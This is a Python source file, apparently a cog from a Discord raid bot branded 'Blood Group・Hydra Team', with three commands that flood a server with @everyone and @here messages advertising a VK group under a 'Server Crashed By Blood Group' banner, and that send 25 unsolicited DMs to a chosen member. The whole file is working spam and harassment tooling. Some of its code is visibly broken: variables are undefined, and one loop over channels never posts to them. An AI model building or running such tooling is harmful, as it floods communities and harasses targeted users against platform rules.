# coding: utf-8
import os
import json
import discord
import subprocess
import datetime
from os import system, name
from discord.ext.commands.core import cooldown
from discord import Permissions

from discord.ext import(
    commands,
    tasks
)


class Spam_Commands(commands.Cog):

    def __init__(self, client):
        self.client = client


    # Mass sending of messages to all channels
    @commands.command(aliases=["all_channels_spam", "guild_spam", "global_spam", "acs", "gs"])
    @commands.cooldown(1, 300, commands.BucketType.user)
    async def all_spam(self, ctx):

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            try:
                await ctx.message.delete()

                embed = discord.Embed(
                    title = "Server Crashed By Blood Group",
                    description = spam_message,
                    color = 0xb9b9b9
                )
                embed.set_image(url='https://media.discordapp.net/attachments/1045645133003104270/1045647837200908288/image.png?width=1108&height=443')

                for channel in ctx.guild.text_channels:
                    for i in range(5):
                        await ctx.send(f'@everyone @here Link to the Vk: https://vk.com/bloodiga_group\n', embed=embed)

            except Exception as e: print(e)


    # Mass sending of messages to the channels
    @commands.command(aliases=["default_spam"])
    @commands.cooldown(1, 300, commands.BucketType.user)
    async def spam(self, ctx):

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            try:
                await ctx.message.delete()

                embed = discord.Embed(
                    title = f'''Hydra - Spam''',
                    description = f'''{spam_message}''',
                    color = 0xb9b9b9
                )
                embed.set_image(url='https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png')

                for i in range(25):
                    await ctx.send('@everyone Link to the Vk: https://vk.com/bloodiga_group\n', embed=embed)

            except Exception as e: print(e)


    # Mass sending of messages to the mentioned
    @commands.command(aliases=["dm_spam", "user_spam", "d_s", "u_s"])
    @commands.cooldown(1, 300, commands.BucketType.user)
    async def dmspam(self, ctx, member: discord.Member):

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            try:
                await ctx.message.delete()

                embed = discord.Embed(
                    title = f'''Hydra - Spam''',
                    description = f'''{spam_message}''',
                    color = 0xb9b9b9
                )
                embed.set_image(url='https://media.discordapp.net/attachments/1045645133003104270/1045647837200908288/image.png?width=1108&height=443')

                await ctx.message.delete()
                dm = await member.create_dm()

                for i in range(25):
                    try:
                        await dm.send('Link to the Vk: https://vk.com/bloodiga_group\n', embed=embed)
                    except:
                        await ctx.author.send("У указанного вами пользователя отключен доступ к личным сообщениям у посторонних.")

            except Exception as e: print(e)


def setup(client):
    client.add_cog(Spam_Commands(client))